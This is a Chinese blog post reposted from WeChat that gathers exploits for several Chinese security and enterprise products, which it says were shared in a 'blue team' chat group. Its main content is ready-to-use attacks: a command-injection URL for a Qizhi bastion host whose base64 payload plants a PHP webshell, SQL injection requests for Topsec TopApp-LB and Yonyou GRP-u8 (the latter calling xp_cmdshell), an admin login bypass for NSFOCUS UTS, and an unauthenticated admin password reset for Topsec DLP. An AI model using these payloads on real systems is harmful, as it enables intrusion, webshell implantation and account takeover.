\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/AjPgq4RhKjgbX7STE3jWDg)

下午一觉醒来, 发现某蓝队群里正在讨论关于几个厂商的安全漏洞, 也分享到群了。

0、齐治堡垒机前台远程命令执行漏洞（CNVD-2019-20835）

未授权无需登录。

1、访问 http://10.20.10.11/listener/cluster\_manage.php  : 返回 "OK".

2、访问如下链接即可 getshell，执行成功后，生成 PHP 一句话马

3、/var/www/shterm/resources/qrcode/lbj77.php  密码 10086

```
https://10.20.10.10/ha\_request.php?action=install&ipaddr=10.20.10.11&node\_id=1${IFS}|\`echo${IFS}" ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK"|base64${IFS}- d|bash\`|${IFS}|echo${IFS}

```

![](https://mmbiz.qpic.cn/mmbiz_png/gEVuGz7Ip7T9XJ4Tib6MVshTVmOUYpcicE8UEGQJf3VVPU2ia5LUic9mXWTdoiahWDSITepRuyI9wiaxRkN4SbJCGuMw/640?wx_fmt=png)

这里假设 10.20.10.10 为堡垒机的 IP 地址。  

1、天融信 TopApp-LB 负载均衡系统 Sql 注入漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/gEVuGz7Ip7T9XJ4Tib6MVshTVmOUYpcicE5AW12sTdkdtvHSEv3NVLFuWUKYIIb0hpMUGvsbb6RAdN5vU7UvlL3A/640?wx_fmt=png)

```
POST /acc/clsf/report/datasource.php HTTP/1.1
Host: localhost
Connection: close
Accept: text/javascript, text/html, application/xml, text/xml, \*/\*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10\_15\_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
t=l&e=0&s=t&l=1&vid=1+union select 1,2,3,4,5,6,7,8,9,substr('a',1,1),11,12,13,14,15,16,17,18,19,20,21,22--+&gid=0&lmt=10&o=r\_Speed&asc=false&p=8&lipf=&lipt=&ripf=&ript=&dscp=&proto=&lpf=&lpt=&rpf=&rpt=@。。

```

网友称以下两个历史漏洞仍然可以复现。

https://www.uedbox.com/post/21626/

https://www.uedbox.com/post/22193/

2、用友 GRP-u8 注入

![](https://mmbiz.qpic.cn/mmbiz_png/gEVuGz7Ip7T9XJ4Tib6MVshTVmOUYpcicEYiaZjXJQic5ic25SpakRvPOZJQSE1R9xsico6E92XYHIMHVRLWVFfDdKyg/640?wx_fmt=png)

```
POST /Proxy HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;)
Host: localhost
Content-Length: 341
Connection: Keep-Alive
Cache-Control: no-cache
cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS\_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp\_cmdshell 'whoami'</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>

```

3、绿盟 UTS 综合威胁探针管理员任意登录

逻辑漏洞, 利用方式参考（https://www.hackbug.net/archives/112.html）

1、修改登录数据包 {"status":false,"mag":""} -> {"status":true,"mag":""}

2、/webapi/v1/system/accountmanage/account 接口逻辑错误泄漏了管理员的账户信息包括密码（md5）

3、再次登录, 替换密码上个数据包中 md5 密码。

4、登录成功。

![](https://mmbiz.qpic.cn/mmbiz_png/gEVuGz7Ip7T9XJ4Tib6MVshTVmOUYpcicEs9o9BvmL5xm2ODFNYQicqVI8BO6ZyckvKNL39riajCVzArUBJgASE76Q/640?wx_fmt=png)

4、天融信数据防泄漏系统越权修改管理员密码

无需登录权限, 由于修改密码处未校验原密码, 且 /?module=auth\_user&action=mod\_edit\_pwd

接口未授权访问, 造成直接修改任意用户密码。: 默认 superman 账户 uid 为 1。

POST /?module=auth\_user&action=mod\_edit\_pwd 

Cookie: username=superman;

uid=1&pd=Newpasswd&mod\_pwd=1&dlp\_perm=1

![](https://mmbiz.qpic.cn/mmbiz_png/gEVuGz7Ip7T9XJ4Tib6MVshTVmOUYpcicEicDtbmCPyGaxwDO9slR2fhhrd01rFkOuQM0f9oVjyuHerVu4Aiav5BQQ/640?wx_fmt=png)

5、WPS Office 图片解析错误导致堆损坏，任意代码执行。

看上去 (算了看不懂... , 漏洞利用可能导致拒绝服务。

相关参考:

http://zeifan.my/security/rce/heap/2020/09/03/wps-rce-heap.html

以上内容均为网友分享, 作者并未实际复现。